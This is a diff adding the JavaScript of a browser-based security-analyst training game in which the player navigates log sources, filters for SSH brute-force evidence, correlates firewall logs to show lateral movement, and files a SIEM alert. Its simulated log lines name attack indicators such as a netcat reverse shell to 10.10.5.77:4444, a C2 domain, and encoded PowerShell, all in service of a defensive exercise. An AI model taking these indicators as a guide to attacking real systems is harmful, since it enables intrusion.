+        if (nc < 0 || nc >= COLS || nr < 0 || nr >= ROWS) {
+            printLine('  ' + d.name + ': [network edge]', 'system');
+            return;
+        }
+        var type = GRID_MAP[nr][nc];
+        if (type === 'wall') {
+            printLine('  ' + d.name + ': [blocked]', 'system');
+            return;
+        }
+        var key = nc + ',' + nr;
+        if (!STATE.visibility[key] || STATE.visibility[key] === 'hidden') {
+            STATE.visibility[key] = 'revealed';
+        }
+        if (type === 'empty') {
+            printLine('  ' + d.name + ': Clear path', 'info');
+        } else {
+            var info = CELL_INFO[type];
+            printLine('  ' + d.name + ': ' + info.label + ' (' + info.ip + ')', 'node-info');
+        }
+    });
+
+    updateGrid();
+    saveState();
+}
+
+function cmdMove(args) {
+    if (!args.length) {
+        printLine('Usage: move <direction>', 'error');
+        printLine('Directions: north/south/east/west (or n/s/e/w)', 'system');
+        return;
+    }
+
+    var dirMap = {
+        'north': [0,-1], 'n': [0,-1],
+        'south': [0,1],  's': [0,1],
+        'east':  [1,0],  'e': [1,0],
+        'west':  [-1,0], 'w': [-1,0]
+    };
+
+    var dir = args[0].toLowerCase();
+    if (!dirMap[dir]) {
+        printLine('Unknown direction: ' + args[0], 'error');
+        printLine('Use: north/south/east/west (or n/s/e/w)', 'system');
+        return;
+    }
+
+    var d = dirMap[dir];
+    var newCol = STATE.position.col + d[0];
+    var newRow = STATE.position.row + d[1];
+
+    // Bounds check
+    if (newCol < 0 || newCol >= COLS || newRow < 0 || newRow >= ROWS) {
+        printLine('Edge of network. Cannot move ' + dir + '.', 'error');
+        return;
+    }
+
+    var cellType = GRID_MAP[newRow][newCol];
+
+    // Wall check
+    if (cellType === 'wall') {
+        printLine('Blocked. No traversable path ' + dir + '.', 'error');
+        return;
+    }
+
+    // No firewall gate — all non-wall cells are freely movable
+    STATE.position = { col: newCol, row: newRow };
+    STATE.visibility[newCol + ',' + newRow] = 'visited';
+
+    // Track discovered log sources (not empty cells)
+    if (cellType !== 'empty') {
+        STATE.nodesDiscovered.add(cellType);
+    }
+
+    revealAdjacent(newCol, newRow);
+
+    // Direction display name
+    var dirFull = { n: 'north', s: 'south', e: 'east', w: 'west' };
+    var dirName = dirFull[dir] || dir;
+
+    if (cellType === 'empty') {
+        printLine('Moving ' + dirName + '... Clear path.', 'system');
+    } else {
+        var info = CELL_INFO[cellType];
+        printLine('Moving ' + dirName + '... ' + info.label + ' (' + info.ip + ')', 'success');
+        printLine(info.desc, 'info');
+        printLine('Type "logs" to view log entries for this source.', 'system');
+    }
+
+    checkObjectives();
+    updateGrid();
+    saveState();
+}
+
+function cmdLogs() {
+    var col = STATE.position.col;
+    var row = STATE.position.row;
+    var cellType = GRID_MAP[row][col];
+
+    // Must be on a named node
+    if (cellType === 'empty' || cellType === 'wall') {
+        printLine('No log source at current position.', 'error');
+        printLine('Move to a log node first. Type "scan" to see adjacent nodes.', 'system');
+        return;
+    }
+
+    var info = CELL_INFO[cellType];
+    var entries = LOG_CONTENT[cellType];
+
+    printLine('', 'system');
+    printLine('\u2550\u2550\u2550 ' + info.label + ' (' + info.ip + ') \u2550\u2550\u2550', 'heading');
+    printLine('OS: ' + info.os, 'node-info');
+    printLine('', 'system');
+
+    entries.forEach(function(line) {
+        // Colour lines that mention the attacker IP differently
+        if (line.indexOf('10.10.5.77') !== -1 || line.indexOf('ALERT') !== -1 || line.indexOf('[WARN]') !== -1) {
+            printLine(line, 'warning');
+        } else if (line.indexOf('[NOTE]') !== -1 || line.indexOf('[POLICY]') !== -1) {
+            printLine(line, 'node-info');
+        } else {
+            printLine(line, 'info');
+        }
+    });
+
+    printLine('', 'system');
+
+    // Mark this source as viewed for timeline tracking
+    STATE.logsViewed.add(cellType);
+    saveState();
+}
+
+function cmdFilter(args) {
+    if (!args.length) {
+        printLine('Usage: filter <keyword>', 'error');
+        printLine('Searches current node logs for the keyword.', 'system');
+        return;
+    }
+
+    var col = STATE.position.col;
+    var row = STATE.position.row;
+    var cellType = GRID_MAP[row][col];
+
+    // Must be on a log node
+    if (cellType === 'empty' || cellType === 'wall') {
+        printLine('No log source at current position.', 'error');
+        printLine('Move to a log node first, then filter.', 'system');
+        return;
+    }
+
+    var keyword = args.join(' ').toLowerCase();
+    var info = CELL_INFO[cellType];
+    var entries = LOG_CONTENT[cellType];
+
+    var matches = entries.filter(function(line) {
+        return line.toLowerCase().indexOf(keyword) !== -1;
+    });
+
+    printLine('', 'system');
+    printLine('filter "' + keyword + '" on ' + info.label + ':', 'heading');
+    printLine('', 'system');
+
+    if (matches.length === 0) {
+        printLine('No matches found for "' + keyword + '".', 'system');
+        return;
+    }
+
+    matches.forEach(function(line) {
+        if (line.indexOf('10.10.5.77') !== -1 || line.indexOf('Failed password') !== -1) {
+            printLine(line, 'warning');
+        } else {
+            printLine(line, 'info');
+        }
+    });
+
+    printLine('', 'system');
+    printLine(matches.length + ' match(es).', 'node-info');
+
+    // Brute-force detection: filtering auth-logs for 'fail' reveals the pattern
+    if (cellType === 'auth-logs' && (keyword.indexOf('fail') !== -1 || keyword.indexOf('password') !== -1 || keyword.indexOf('10.10.5.77') !== -1)) {
+        if (!STATE.bruteForceFound) {
+            STATE.bruteForceFound = true;
+            printLine('', 'system');
+            printLine('[!] PATTERN DETECTED', 'warning');
+            printLine('IP 10.10.5.77 made 6+ failed SSH attempts in under 15 seconds.', 'warning');
+            printLine('This matches a credential brute-force pattern.', 'warning');
+            printLine('Recommend: cross-reference with firewall-logs. Try "correlate auth-logs firewall-logs".', 'info');
+            checkObjectives();
+        }
+    }
+
+    saveState();
+}
+
+function cmdCorrelate(args) {
+    if (args.length < 2) {
+        printLine('Usage: correlate <nodeA> <nodeB>', 'error');
+        printLine('Both nodes must have been visited. Example:', 'system');
+        printLine('  correlate auth-logs firewall-logs', 'system');
+        return;
+    }
+
+    // Resolve both nodes
+    var nodeA = resolveNode(args[0]);
+    var nodeB = resolveNode(args[1]);
+
+    if (!nodeA) {
+        printLine('Unknown node: ' + args[0], 'error');
+        return;
+    }
+    if (!nodeB) {
+        printLine('Unknown node: ' + args[1], 'error');
+        return;
+    }
+
+    // Both must have been visited
+    if (nodeA.visibility !== 'visited') {
+        printLine(nodeA.info.label + ' has not been visited. Navigate there first.', 'warning');
+        return;
+    }
+    if (nodeB.visibility !== 'visited') {
+        printLine(nodeB.info.label + ' has not been visited. Navigate there first.', 'warning');
+        return;
+    }
+
+    var typeA = nodeA.type;
+    var typeB = nodeB.type;
+
+    // Normalize pair for order-independent matching
+    var pair = [typeA, typeB].sort().join('+');
+
+    printLine('', 'system');
+    printLine('\u2550\u2550\u2550 CORRELATE: ' + nodeA.info.label + ' + ' + nodeB.info.label + ' \u2550\u2550\u2550', 'heading');
+    printLine('', 'system');
+
+    // ─── Key correlation: firewall-logs + auth-logs reveals lateral movement ───
+    if (pair === 'auth-logs+firewall-logs') {
+        printLine('Cross-referencing SSH failures with firewall traffic...', 'system');
+        printLine('', 'system');
+        printLine('[AUTH]  02:10:14 - 02:14:07 | 6x Failed SSH from 10.10.5.77 -> 10.10.1.20', 'warning');
+        printLine('[FW]    02:10:14 | PASS  10.10.5.77 -> 10.10.1.20 :22', 'warning');
+        printLine('[FW]    02:12:05 | PASS  10.10.5.77 -> 10.10.3.50 :22  <-- PIVOT', 'warning');
+        printLine('[FW]    02:12:47 | PASS  10.10.5.77 -> 10.10.4.10 :22  <-- LATERAL MOVE', 'warning');
+        printLine('[FW]    02:13:30 | PASS  10.10.5.77 -> 10.10.4.22 :22  <-- LATERAL MOVE', 'warning');
+        printLine('', 'system');
+        printLine('[!] LATERAL MOVEMENT CONFIRMED', 'success');
+        printLine('Attacker IP 10.10.5.77 gained SSH access then pivoted to 3 internal hosts.', 'success');
+        printLine('TTPs: Credential brute-force followed by lateral SSH movement.', 'info');
+        printLine('', 'system');
+        printLine('Next step: File a detection alert. Try "alert brute force lateral movement 10.10.5.77".', 'info');
+
+        if (!STATE.lateralFound) {
+            STATE.lateralFound = true;
+            checkObjectives();
+        }
+
+    // ─── dns-logs + proxy-logs: C2 callback pattern ───
+    } else if (pair === 'dns-logs+proxy-logs') {
+        printLine('Cross-referencing DNS queries with proxy traffic...', 'system');
+        printLine('', 'system');
+        printLine('[DNS]   02:09:31 | 10.10.5.77 queried c2.malware-domain.xyz (RPZ blocked)', 'warning');
+        printLine('[PROXY] 02:09:31 | 10.10.5.77 TCP_DENIED c2.malware-domain.xyz (policy blocked)', 'warning');
+        printLine('', 'system');
+        printLine('[INFO] C2 callback attempt blocked at both DNS and proxy layers.', 'node-info');
+        printLine('Defense-in-depth is working. Source IP 10.10.5.77 tried two egress paths.', 'info');
+
+    // ─── endpoint-logs + firewall-logs: post-exploitation egress ───
+    } else if (pair === 'endpoint-logs+firewall-logs') {
+        printLine('Cross-referencing Sysmon events with firewall traffic...', 'system');
+        printLine('', 'system');
+        printLine('[EPT]  02:14:04 | 10.10.3.50 -> 10.10.5.77:4444 (netcat reverse shell)', 'warning');
+        printLine('[FW]   02:14:04 | PASS  10.10.3.50 -> 10.10.5.77:4444 (egress not blocked)', 'warning');
+        printLine('', 'system');
+        printLine('[!] Reverse shell egress was NOT blocked by the firewall.', 'warning');
+        printLine('Outbound rule gap on high ports. Recommend egress filtering review.', 'info');
+
+    // ─── web-logs + auth-logs: initial access vector ───
+    } else if (pair === 'auth-logs+web-logs') {
+        printLine('Cross-referencing web access with auth failures...', 'system');
+        printLine('', 'system');
+        printLine('[WEB]  01:55:33 | 10.10.5.77 probed /admin/config (404)', 'info');
+        printLine('[WEB]  02:01:14 | 10.10.5.77 attempted path traversal (400, blocked)', 'info');
+        printLine('[AUTH] 02:10:14 | 10.10.5.77 began SSH brute-force', 'warning');
+        printLine('', 'system');
+        printLine('[INFO] Timeline: web recon at 01:55, SSH brute-force at 02:10.', 'node-info');
+        printLine('Initial access vector was likely port scan followed by credential attack.', 'info');
+
+    // ─── mail-logs + dns-logs: phishing + C2 timing ───
+    } else if (pair === 'dns-logs+mail-logs') {
+        printLine('Cross-referencing mail events with DNS activity...', 'system');
+        printLine('', 'system');
+        printLine('[MAIL] 01:52:17 | Phishing email received, attachment quarantined', 'info');
+        printLine('[DNS]  02:09:31 | C2 domain query from 10.10.5.77 (17 min later)', 'warning');
+        printLine('', 'system');
+        printLine('[INFO] Phishing attempt preceded C2 activity by ~17 minutes.', 'node-info');
+        printLine('If phishing email was opened, 10.10.5.77 may have gained initial foothold via attachment.', 'info');
+
+    // ─── Default: interesting but non-objective result ───
+    } else {
+        printLine('Analyzing log overlap between ' + nodeA.info.label + ' and ' + nodeB.info.label + '...', 'system');
+        printLine('', 'system');
+        printLine('No strong correlation pattern found between these two sources.', 'info');
+        printLine('Common indicator: IP 10.10.5.77 appears in multiple logs across the network.', 'info');
+        printLine('Try correlating auth-logs with firewall-logs for the key finding.', 'system');
+    }
+
+    printLine('', 'system');
+    saveState();
+}
+
+function cmdAlert(args) {
+    if (!args.length) {
+        printLine('Usage: alert <description>', 'error');
+        printLine('Example: alert brute force lateral movement from 10.10.5.77', 'system');
+        return;
+    }
+
+    var text = args.join(' ');
+    var textLower = text.toLowerCase();
+
+    printLine('', 'system');
+    printLine('\u2550\u2550\u2550 FILING DETECTION ALERT \u2550\u2550\u2550', 'heading');
+    printLine('', 'system');
+    printLine('Analyst:    analyst@siem', 'info');
+    printLine('Timestamp:  ' + new Date().toISOString().replace('T', ' ').substring(0, 19) + ' UTC', 'info');
+    printLine('Alert text: ' + text, 'node-info');
+    printLine('', 'system');
+
+    // Valid alert: must contain a meaningful keyword related to the incident
+    if (textLower.indexOf('lateral') !== -1 || textLower.indexOf('brute') !== -1) {
+        printLine('[SIEM] ALERT FILED — ID: SOC-2024-1114-001', 'success');
+        printLine('[SIEM] Severity: HIGH', 'success');
+        printLine('[SIEM] Category: Credential Attack / Lateral Movement', 'success');
+        printLine('[SIEM] Alert routed to IR queue.', 'success');
+
+        if (!STATE.alertFiled) {
+            STATE.alertFiled = true;
+            checkObjectives();
+        }
+    } else if (textLower.indexOf('c2') !== -1 || textLower.indexOf('malware') !== -1 || textLower.indexOf('shell') !== -1) {
+        printLine('[SIEM] ALERT FILED — ID: SOC-2024-1114-002', 'success');
+        printLine('[SIEM] Severity: CRITICAL', 'success');
+        printLine('[SIEM] Category: C2 / Post-Exploitation', 'success');
+        printLine('[SIEM] Alert routed to IR queue.', 'success');
+
+        if (!STATE.alertFiled) {
+            STATE.alertFiled = true;
+            checkObjectives();
+        }
+    } else {
+        printLine('[SIEM] Alert received but classification is unclear.', 'warning');
+        printLine('[SIEM] Include specific threat indicators (e.g., brute force, lateral movement, C2).', 'warning');
+        printLine('[SIEM] Alert held for analyst review.', 'system');
+    }
+
+    printLine('', 'system');
+    saveState();
+}
+
+function cmdTimeline() {
+    printLine('', 'system');
+    printLine('\u2550\u2550\u2550 INCIDENT TIMELINE \u2550\u2550\u2550', 'heading');
+    printLine('Based on log sources visited:', 'system');
+    printLine('', 'system');
+
+    var events = [];
+
+    if (STATE.logsViewed.has('web-logs') || STATE.logsViewed.has('mail-logs')) {
+        events.push({ time: '01:45', src: 'MAIL',  desc: 'Phishing email received, attachment blocked', type: 'info' });
+        events.push({ time: '01:55', src: 'WEB',   desc: '10.10.5.77 probes /admin/config (recon)', type: 'warning' });
+        events.push({ time: '02:01', src: 'WEB',   desc: '10.10.5.77 attempts path traversal (blocked)', type: 'warning' });
+    }
+    if (STATE.logsViewed.has('auth-logs') || STATE.bruteForceFound) {
+        events.push({ time: '02:10', src: 'AUTH',  desc: '10.10.5.77 begins SSH brute-force (6+ attempts)', type: 'warning' });
+        events.push({ time: '02:14', src: 'AUTH',  desc: 'PAM: 6 auth failures from 10.10.5.77', type: 'warning' });
+    }
+    if (STATE.logsViewed.has('dns-logs')) {
+        events.push({ time: '02:09', src: 'DNS',   desc: 'C2 domain query c2.malware-domain.xyz (blocked)', type: 'warning' });
+    }
+    if (STATE.logsViewed.has('firewall-logs') || STATE.lateralFound) {
+        events.push({ time: '02:12', src: 'FW',    desc: '10.10.5.77 pivots to 10.10.3.50 via SSH', type: 'warning' });
+        events.push({ time: '02:12', src: 'FW',    desc: '10.10.5.77 pivots to 10.10.4.10 via SSH', type: 'warning' });
+        events.push({ time: '02:13', src: 'FW',    desc: '10.10.5.77 pivots to 10.10.4.22 via SSH', type: 'warning' });
+    }
+    if (STATE.logsViewed.has('endpoint-logs')) {
+        events.push({ time: '02:14', src: 'EPT',   desc: 'Encoded PowerShell + netcat executed on 10.10.3.50', type: 'error' });
+        events.push({ time: '02:14', src: 'EPT',   desc: 'Reverse shell egress: 10.10.3.50 -> 10.10.5.77:4444', type: 'error' });
+    }
+    if (STATE.alertFiled) {
+        events.push({ time: 'NOW',  src: 'SIEM',  desc: 'Detection alert filed by analyst', type: 'success' });
+    }
+
+    if (events.length === 0) {
+        printLine('No events recorded yet. Visit log sources to build the timeline.', 'system');
+        printLine('Start by typing "logs" on each node, then "filter" for specific indicators.', 'info');
+        return;
+    }
+
+    // Sort by time (NOW goes last)
+    events.sort(function(a, b) {
+        if (a.time === 'NOW') return 1;
+        if (b.time === 'NOW') return -1;
+        return a.time.localeCompare(b.time);
+    });
+
+    events.forEach(function(ev) {
+        var line = '  ' + padRight(ev.time, 6) + ' [' + padRight(ev.src, 4) + ']  ' + ev.desc;
+        printLine(line, ev.type);
+    });
+
+    printLine('', 'system');
+    printLine(events.length + ' events reconstructed.', 'node-info');
+    saveState();
+}
+
+function cmdStatus() {
+    var col = STATE.position.col;
+    var row = STATE.position.row;
+    var cellType = GRID_MAP[row][col];
+    var posLabel = (cellType !== 'empty' && cellType !== 'wall') ? CELL_INFO[cellType].label : 'Clear';
+
+    printLine('', 'system');
+    printLine('\u2550\u2550\u2550 STATUS \u2550\u2550\u2550', 'heading');
+    printLine('Position:        (' + col + ',' + row + ') \u2014 ' + posLabel, 'info');
+    printLine('Log sources:     ' + STATE.nodesDiscovered.size + ' / 8 visited', 'info');
+    printLine('Logs viewed:     ' + STATE.logsViewed.size, 'info');
+    printLine('Commands used:   ' + STATE.commandCount, 'info');
+    printLine('Brute force:     ' + (STATE.bruteForceFound ? 'FOUND' : 'not yet identified'), STATE.bruteForceFound ? 'success' : 'system');
+    printLine('Lateral move:    ' + (STATE.lateralFound ? 'CONFIRMED' : 'not yet correlated'), STATE.lateralFound ? 'success' : 'system');
+    printLine('Alert filed:     ' + (STATE.alertFiled ? 'YES' : 'pending'), STATE.alertFiled ? 'success' : 'system');
+    printLine('', 'system');
+    printLine('Objectives:', 'heading');
+
+    var objText = [
+        'Discover 5 log sources (' + STATE.nodesDiscovered.size + '/5)',
+        'Find brute-force evidence in auth logs',
+        'Correlate lateral movement (auth-logs + firewall-logs)',
+        'File a detection alert'
+    ];
+
+    STATE.objectives.forEach(function(done, i) {
+        printLine((done ? ' [X] ' : ' [ ] ') + objText[i], done ? 'success' : 'system');
+    });
+}
+
+// ═══ Utility ═══
+
+function padRight(str, len) {
+    str = String(str);
+    while (str.length < len) str += ' ';
+    return str;
+}
+
+// ═══ Objectives ═══
+
+function checkObjectives() {
+    var prev = STATE.objectives.slice();
+
+    // 1. Visit 5 log sources
+    STATE.objectives[0] = STATE.nodesDiscovered.size >= 5;
+
+    // 2. Brute-force evidence found via filter command
+    STATE.objectives[1] = STATE.bruteForceFound;
+
+    // 3. Lateral movement correlated via correlate command
+    STATE.objectives[2] = STATE.lateralFound;
+
+    // 4. Detection alert filed via alert command
+    STATE.objectives[3] = STATE.alertFiled;
+
+    // Announce newly completed objectives
+    STATE.objectives.forEach(function(done, i) {
+        if (done && !prev[i]) {
+            printLine('', 'system');
+            printLine('[OBJECTIVE COMPLETE] ' + OBJ_LABELS[i], 'success');
+        }
+    });
+
+    updateObjectivesUI();
+
+    // All complete?
+    if (STATE.objectives.every(Boolean) && !STATE.completed) {
+        STATE.completed = true;
+        var elapsed = Math.floor((Date.now() - STATE.startTime) / 1000);
+
+        // Save completion record, remove mid-mission save
+        var stats = {
+            completed: true,
+            time: elapsed,
+            commands: STATE.commandCount,
+            sourcesDiscovered: STATE.nodesDiscovered.size,
+            timestamp: Date.now()
+        };
+        try {
+            localStorage.setItem('hexworth_operator_loganalysis01', JSON.stringify(stats));
+            localStorage.removeItem('hexworth_operator_loganalysis01_save');
+        } catch (e) {}
+
+        printLine('', 'system');
+        printLine('\u2550\u2550\u2550 ALL OBJECTIVES COMPLETE \u2550\u2550\u2550', 'heading');
+        printLine('Mission LOG-01 accomplished. Threat contained.', 'success');
+
+        document.getElementById('header-status').textContent = 'COMPLETE';
+        document.getElementById('header-status').style.color = '#39ff14';
+
+        setTimeout(function() { showMissionComplete(elapsed); }, 1500);
+    }
+}
+
+function updateObjectivesUI() {
+    STATE.objectives.forEach(function(done, i) {
+        var el = document.getElementById('obj-' + i);
+        if (!el) return;
+        var check = el.querySelector('.obj-check');
+        if (done) {
+            el.classList.add('complete');
+            check.textContent = '\u2713';
+        } else {
+            el.classList.remove('complete');
+            check.textContent = '';
+        }
+    });
+}
+
+function showMissionComplete(elapsed) {
+    var mins = Math.floor(elapsed / 60);
+    var secs = elapsed % 60;
+    var timeStr = mins > 0 ? mins + 'm ' + secs + 's' : secs + 's';
+
+    document.getElementById('stat-sources').textContent = STATE.nodesDiscovered.size;
+    document.getElementById('stat-commands').textContent = STATE.commandCount;
+    document.getElementById('stat-time').textContent = timeStr;
+
+    document.getElementById('mission-complete').classList.add('visible');
+}
+
+// ═══ Save / Load ═══
+
+function saveState() {
+    try {
+        var data = {
+            position: STATE.position,
+            visibility: STATE.visibility,
+            objectives: STATE.objectives,
+            nodesDiscovered: Array.from(STATE.nodesDiscovered),
+            logsViewed: Array.from(STATE.logsViewed),
+            bruteForceFound: STATE.bruteForceFound,
+            lateralFound: STATE.lateralFound,
+            alertFiled: STATE.alertFiled,
+            commandCount: STATE.commandCount,
+            startTime: STATE.startTime
+        };
+        localStorage.setItem('hexworth_operator_loganalysis01_save', JSON.stringify(data));
+    } catch (e) {}
+}
+
+function loadState() {
+    try {
+        var saved = localStorage.getItem('hexworth_operator_loganalysis01_save');
+        if (!saved) return false;
+        var data = JSON.parse(saved);
+        STATE.position = data.position;
+        STATE.visibility = data.visibility;
+        STATE.objectives = data.objectives;
+        STATE.nodesDiscovered = new Set(data.nodesDiscovered);
+        STATE.logsViewed = new Set(data.logsViewed || []);
+        STATE.bruteForceFound = data.bruteForceFound || false;
+        STATE.lateralFound = data.lateralFound || false;
+        STATE.alertFiled = data.alertFiled || false;
+        STATE.commandCount = data.commandCount;
+        STATE.startTime = data.startTime;
+        return true;
+    } catch (e) {
+        return false;
+    }
+}
+
+function resetState() {
+    STATE = {
+        position: { col: 0, row: 0 },
+        visibility: {},
+        objectives: [false, false, false, false],
+        nodesDiscovered: new Set(),
+        logsViewed: new Set(),
+        bruteForceFound: false,
+        lateralFound: false,
+        alertFiled: false,
+        commandCount: 0,
+        commandHistory: [],
+        historyIndex: -1,
+        startTime: Date.now(),
+        completed: false
+    };
+    // Starting cell: SIEM console at (0,0)
+    STATE.visibility['0,0'] = 'visited';
+    STATE.nodesDiscovered.add('siem-console');
+    revealAdjacent(0, 0);
+}
+
+// ═══ Command Parser ═══
+
+function executeCommand(input) {
+    STATE.commandCount++;
+
+    // Echo prompt + input
+    printLine('analyst@siem:~$ ' + input, 'prompt-echo');
+
+    var parts = input.trim().split(/\s+/);
+    var cmd = parts[0].toLowerCase();
+    var args = parts.slice(1);
+
+    switch (cmd) {
+        case 'scan':      cmdScan(); break;
+        case 'move':      cmdMove(args); break;
+        case 'logs':      cmdLogs(); break;
+        case 'filter':    cmdFilter(args); break;
+        case 'correlate': cmdCorrelate(args); break;
+        case 'alert':     cmdAlert(args); break;
+        case 'timeline':  cmdTimeline(); break;
+        case 'status':    cmdStatus(); break;
+        case 'help':      cmdHelp(); break;
+        case 'clear':
+            document.getElementById('term-output').innerHTML = '';
+            break;
+        default:
+            printLine('Unknown command: ' + cmd, 'error');
+            printLine('Type "help" for available commands.', 'system');
+    }
+}
+
+// ═══ Terminal Input ═══
+
+function setupInput() {
+    var input = document.getElementById('term-input');
+
+    input.addEventListener('keydown', function(e) {
+        if (e.key === 'Enter') {
+            var cmd = this.value.trim();
+            if (cmd) {
+                STATE.commandHistory.push(cmd);
+                STATE.historyIndex = STATE.commandHistory.length;
+                executeCommand(cmd);
+            }
+            this.value = '';
+        } else if (e.key === 'ArrowUp') {
+            e.preventDefault();
+            if (STATE.historyIndex > 0) {
+                STATE.historyIndex--;
+                this.value = STATE.commandHistory[STATE.historyIndex];
+            }
+        } else if (e.key === 'ArrowDown') {
+            e.preventDefault();
+            if (STATE.historyIndex < STATE.commandHistory.length - 1) {
+                STATE.historyIndex++;
+                this.value = STATE.commandHistory[STATE.historyIndex];
+            } else {
+                STATE.historyIndex = STATE.commandHistory.length;
+                this.value = '';
+            }
+        }
+    });
+
+    // Click anywhere in the terminal panel to focus the input
+    document.getElementById('term-panel').addEventListener('click', function(e) {
+        if (e.target.tagName !== 'INPUT') input.focus();
+    });
+}
+
+// ═══ Mission Briefing ═══
+
+function showBriefing() {
+    printLine('\u2554\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2557', 'heading');
+    printLine('\u2551  MISSION: LOG-01 \u2014 SIGNAL IN THE NOISE  \u2551', 'heading');
+    printLine('\u2560\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2563', 'heading');
+    printLine('\u2551  SIEM console active. Logs streaming.   \u2551', 'heading');
+    printLine('\u2551  Find the attacker in the noise.        \u2551', 'heading');
+    printLine('\u2551  Correlate evidence. File the alert.    \u2551', 'heading');
+    printLine('\u255A\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u2550\u255D', 'heading');
+    printLine('', 'system');
+    printLine('[SYS] Analyst online at SIEM (10.10.0.1)', 'success');
+    printLine('[SYS] Type "help" for command reference', 'info');
+    printLine('[SYS] Type "scan" to survey the area', 'info');
+    printLine('', 'system');
+}
+
+// ═══ Init ═══
+
+function init() {
+    buildGrid();
+    setupInput();
+
+    var restored = loadState();
+    if (restored && !STATE.completed) {
+        printLine('[SYS] Session restored from save.', 'system');
+        printLine('[SYS] Type "status" to review position and objectives.', 'info');
+        printLine('', 'system');
+    } else {
+        resetState();
+        showBriefing();
+    }
+
+    updateGrid();
+    updateObjectivesUI();
+    document.getElementById('term-input').focus();
+}
+
+document.addEventListener('DOMContentLoaded', init);
+</script>
+
+</body>
+</html>
